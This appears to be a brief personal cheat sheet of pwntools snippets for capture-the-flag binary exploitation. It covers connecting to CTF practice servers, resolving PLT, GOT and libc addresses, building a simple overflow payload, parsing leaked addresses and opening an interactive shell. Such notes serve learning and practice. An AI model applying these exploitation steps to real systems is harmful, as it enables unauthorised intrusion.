---


---

<p>scp -P portnum -r id@address:/want/server/directory /want/local</p>
<p>from pwn import *</p>
<h3 id="nc-connect">nc connect</h3>
<p>p = remote(‘ctf.j0n9hyun.xyz’, 3006)<br>
e = ELF(’./64bof_basic’)</p>
<h3 id="ssh-connect">ssh connect</h3>
<p>ssh = ssh(‘unlink’, ‘<a href="http://pwnable.kr">pwnable.kr</a>’, port = 2222, password = ‘guest’)<br>
s = ssh.process(’/home/unlink/unlink’)<br>
e = ELF(’./unlink’)</p>
<h3 id="func-address-find">func address find</h3>
<p>e = ELF(’./program’)<br>
func_plt = e.plt[‘func’]<br>
func_got = e.got[‘func’]</p>
<p>func_add = e.sym.func<br>
(func_add ==? func_plt)</p>
<p>bss_add = e.bss</p>
<h3 id="libc-address-find">libc address find</h3>
<p>e = ELF(’./program’)<br>
l = e.libc<br>
l.symbols[‘system’]</p>
<h3 id="make-payload">make payload</h3>
<p>payload = ‘’<br>
payload += ‘A’*3<br>
payload += p32(callme)</p>
<h3 id="recv-words">recv words</h3>
<p>s.recvuntil(": ")<br>
StackAdd = int(s.recv(10), 16)<br>
puts_addr = u64(p.recv(6).ljust(8, ‘\x00’))</p>
<h3 id="send-words">send words</h3>
<p>s.send(payload)</p>
<h3 id="end">end</h3>
<p>p.interactive()</p>

